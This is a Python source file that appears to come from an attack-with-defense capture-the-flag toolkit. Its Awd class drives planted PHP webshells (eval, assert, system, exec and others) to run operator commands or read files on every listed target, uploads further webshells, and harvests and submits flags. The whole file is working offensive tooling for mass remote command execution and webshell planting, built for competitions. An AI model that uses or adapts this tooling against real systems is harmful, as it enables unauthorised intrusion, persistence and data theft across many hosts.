from libs.Help import Help
import re
import os
import requests
from libs.Models import Cache, Targets, WebShell
from libs.AttackRequest import AttackRequest
from libs.OutputColor import Color
from config.config import Config
from libs.Tips import Remove

class Awd:

    def __init__(self):
        self.flag = {}
        self.FLAG = False
        self.interface = None
        self.Help = Help()
        self.Cache = Cache()
        self.Targets = Targets()
        self.WebShell = WebShell()
        self.AttackRequest = AttackRequest()

    def operate(self):
        if len(self.Targets.targets) == 0:
            print(Color('No target_ip data added yet!\nPlease use \'add_attack_target\' to add target_ip.\n', 'red').print())
        if len(self.WebShell.webshells) == 0:
            print(Color('No WebShell data added yet!\nPlease use \'add_attack_shell\' to add WebShell.\n', 'red').print())
        shellIndex = 0
        if len(self.WebShell.webshells) > 0:
            self.WebShell.show()
            print(Color('Please choose a WebShell to do command. Input exit to end operate.\n', 'yellow').print())
            while True:
                try:
                    shellIndex = input('[+] WebShellIndex> ')
                    if shellIndex == 'exit':
                        break
                    shellIndex = int(shellIndex) - 1
                    if shellIndex not in range(len(self.WebShell.webshells)):
                        raise Exception()
                    else:
                        print(Color('Now WebShell is: ', 'blue').print().ljust(20, ' '), self.WebShell.webshells[shellIndex])
                        break
                except:
                    print(Color('Please input WebShellIndex(1~n)\n', 'red').print())

        # webshell_type = None
        # try:
        #     webshell_type = self.webshells[shellIndex]['type']
        # except Exception as e:
        #     errorMessage = 'No WebShell!' + str(e) + '\n'
        #     print(Color(errorMessage, 'red').print())

        print(Color('If you want to upload webshell-horse, please input \'horse\'\nIf you want to execute command, please input \'command\'\nPress Ctrl+C to end operate!\n', 'yellow').print())
        inputSelect = input('[+] inputSelect> ').strip().lower()
        if inputSelect == 'horse':
            self.upload_horse(self.WebShell.webshells[shellIndex])
        elif inputSelect == 'command':
            print(self.WebShell.webshells[shellIndex])
            self.execute_command(self.WebShell.webshells[shellIndex])

    def handle_result(self, result, target, flag_judge):
        if result:
            if Config.flag_format:
                flag = re.findall(Config.flag_format, result)
                flag = Remove(flag).list_remove_repeat()
                if flag:
                    flag_judge = True
                    self.flag[target['ip'] + ':' + target['port']] = flag
                    print(Color(self.flag[target['ip'] + ':' + target['port']], 'blue').print())
                else:
                    self.flag[target['ip'] + ':' + target['port']] = []
                    print(Color('Request successfully but can\'t get flag.', 'red').print())
            else:
                print(Color(result, 'blue').print())
        elif result == '':
            print(Color('Request successfully but can\'t get result', 'red').print())

        return flag_judge


    def execute_command(self, webshell):
        global payload
        global file_path
        flag_judge = False

        # if not Config.flag_format:
        #     print(Color('You don\'t set the flag format, please set the flag first.', 'red').print())

        if webshell['WebShell_type'] == 'eval' or webshell['WebShell_type'] == 'assert' or webshell['WebShell_type'] == 'system' or webshell['WebShell_type'] == 'passthru' or webshell['WebShell_type'] == 'exec' or webshell['WebShell_type'] == 'shell_exec':
            """执行命令获取FLAG"""
            if webshell['WebShell_type'] == 'eval':
                payload = input('[+] eval_payload> ').strip()
            elif webshell['WebShell_type'] == 'exec':
                payload = input('[+] exec_payload> ').strip()
            elif webshell['WebShell_type'] == 'assert':
                payload = input('[+] assert_payload> ').strip()
            elif webshell['WebShell_type'] == 'system':
                payload = input('[+] system_payload> ').strip()
            elif webshell['WebShell_type'] == 'passthru':
                payload = input('[+] passthru_payload> ').strip()
            elif webshell['WebShell_type'] == 'shell_exec':
                payload = input('[+] shell_exec_payload> ').strip()

            for target in self.Targets.targets:
                message = '[+] {}:{}    ====>    '.format(target['ip'], target['port'])
                print(Color(message, 'fuchsia').print())
                self.AttackRequest.handle_login(target)
                execute_result = self.AttackRequest.handle_execute_command(target, webshell, payload)
                flag_judge = self.handle_result(execute_result, target, flag_judge)

        elif webshell['WebShell_type'] == 'readfile' or webshell['WebShell_type'] == 'include' or webshell['WebShell_type'] == 'require' or webshell['WebShell_type'] == 'file_get_contents' or webshell['WebShell_type'] == 'include_once' or webshell['WebShell_type'] == 'require_once':
            """直接读取FLAG"""
            if not Config.flag_format:
                print(Color('This mode can\'t set Config.flag_format None', 'red').print())

            if webshell['WebShell_type'] == 'readfile':
                file_path = input('[+] readfile_filePath> ')
            elif webshell['WebShell_type'] == 'include':
                file_path = input('[+] include_filePath> ')
            elif webshell['WebShell_type'] == 'require':
                file_path = input('[+] require_filePath> ')
            elif webshell['WebShell_type'] == 'file_get_contents':
                file_path = input('[+] file_get_contents_filePath> ')
            elif webshell['WebShell_type'] == 'include_once':
                file_path = input('[+] include_once_filePath> ')
            elif webshell['WebShell_type'] == 'require_once':
                file_path = input('[+] require_once_filePath> ')

            for target in self.Targets.targets:
                message = '[+] {}:{}    ====>    '.format(target['ip'], target['port'])
                print(Color(message, 'fuchsia').print())
                self.AttackRequest.handle_login(target)
                read_result = self.AttackRequest.handle_read_file(target, webshell, file_path)
                flag_judge = self.handle_result(read_result, target, flag_judge)

        if flag_judge:
            print(Color('Save flag error!', 'red').print())
            self.Cache.save_flag(self.flag)


    def upload_horse(self, webshell):
        if webshell['type'] == 'eval' or webshell['type'] == 'assert':
            print(Color('Please input the horse_name you need.', 'yellow').print())
            horse_name = input('[+] horse_name> ').strip()
            if os.path.exists('horse/' + str(horse_name) + '.php'):
                for target in self.Targets.targets:
                    message = '[+] {}:{}    ====>    '.format(target['ip'], target['port'])
                    print(Color(message, 'fuchsia').print())
                    self.AttackRequest.handle_login(target)
                    upload_result = self.AttackRequest.handle_upload_horse(target, webshell, horse_name)
                    if upload_result:
                        self.WebShell.webshells.append(upload_result)
                        self.WebShell.webshells = Remove(self.WebShell.webshells).list_remove_repeat()
            else:
                print(Color('The horse selected not exists.', 'red').print())
        else:
            print(Color('WebShell_type is error, can\'t upload WebShell_horse.', 'red').print())

    def show_flag(self):
        for flag in self.flag.values():
            if flag:
                print(Color(flag, 'fuchsia').print())
                self.FLAG = True
        if not self.FLAG:
            return print(Color('Haven\'t get flag.', 'red').print())


    def submit_flag(self):
        global url

        for flag in self.flag.values():
            if flag:
                self.FLAG = True
        if not self.FLAG:
            return print(Color('Haven\'t get flag.', 'red').print())

        try:
            for target, flags in self.flag:
                target = '[+] {}    ====>'.format(target)
                print(Color(target, 'fuchsia'))

                ip = target.split(':')[0]
                port = target.split(':')[1]

                # url = 'http://10.1.8.10/event/1/awd/flag/?token=4826efa9d50c137b&flag=%s'
                url = 'http://{}:{}/{}%s'.format(ip, port, self.interface)

                for flag in flags:
                    flag = flag.strip()
                    try:
                        response = requests.post(url%flag, timeout=2, proxies=Config.proxy)
                        responseContent = response.content.decode('utf-8').strip()
                        print(Color(responseContent, 'blue').print())
                    except requests.Timeout:
                        print(Color('Request timeout!', 'red').print())
        except Exception as e:
            errorMessge = 'Submit error!' + str(e)
            print(Color(errorMessge, 'red').print())